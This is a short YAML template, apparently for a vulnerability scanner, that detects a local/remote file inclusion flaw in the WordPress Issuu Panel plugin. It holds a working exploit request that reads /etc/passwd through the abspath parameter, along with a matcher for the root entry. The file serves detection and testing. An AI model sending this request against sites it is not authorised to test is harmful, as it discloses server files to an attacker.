id: "issuu-panel-lfi"
name: "Wordpress Plugin Issuu Panel Remote/Local File Inclusion"
severity: "high"
description: "The WordPress Issuu Plugin includes an arbitrary file disclosure vulnerability that allows unauthenticated attackers to disclose the content of local and remote files."
tech:
  - "wordpress"
  - "php"
tags:
  - "wp-plugin"
  - "wordpress"
  - "lfi"
  - "rfi"
  - "vuln"
cwe: "CWE-22"
reference: "https://cxsecurity.com/issue/WLB-2016030131"
spaExclusion: true
request:
  method: "GET"
  path: "/wp-content/plugins/issuu-panel/menu/documento/requests/ajax-docs.php?abspath=%2Fetc%2Fpasswd"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "regex"
    part: "body"
    regex:
      - "root:[x*]:0:0"
  - type: "status"
    status:
      - 200
